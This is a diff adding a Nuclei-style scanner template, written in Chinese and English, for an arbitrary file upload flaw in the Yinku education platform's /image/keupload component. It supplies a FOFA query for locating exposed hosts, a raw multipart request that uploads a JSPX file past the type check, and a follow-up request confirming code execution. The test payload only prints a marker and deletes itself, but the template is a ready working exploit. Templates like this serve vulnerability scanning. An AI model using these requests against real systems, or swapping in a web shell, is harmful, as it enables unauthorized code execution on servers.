@@ -1,0 +1,50 @@
+id: yinku-edu-keupload-file-upload
+
+info:
+  name: 因酷教育平台 keupload 组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/image/keupload?" && body="uploadSimpleUrl"
+      该组件通过 /image/keupload 接口实现的文件上传功能未正确校验上传文件类型与路径，攻击者可构造恶意请求上传任意可执行文件，从而在目标系统中获取代码执行权限。
+  tags: 因酷教育平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /image/keupload?param=image&fileType=jpg,gif,png,jpeg,jspx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------308436435515370414691526924874
+    Connection: close
+
+    -----------------------------308436435515370414691526924874
+    Content-Disposition: form-data; name="imgFile"; filename="NTest.jspx"
+    Content-Type: image/jpeg
+
+    <?xml version="1.0" encoding="UTF-8" ?>
+    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+        <jsp:directive.page contentType="text/html;charset=UTF-8" />
+        <jsp:scriptlet>
+            out.println("NdayTest");
+            new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        </jsp:scriptlet>
+    </jsp:root>
+    -----------------------------308436435515370414691526924874--
+- raw:
+  - |
+    GET /image/NTest.jspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
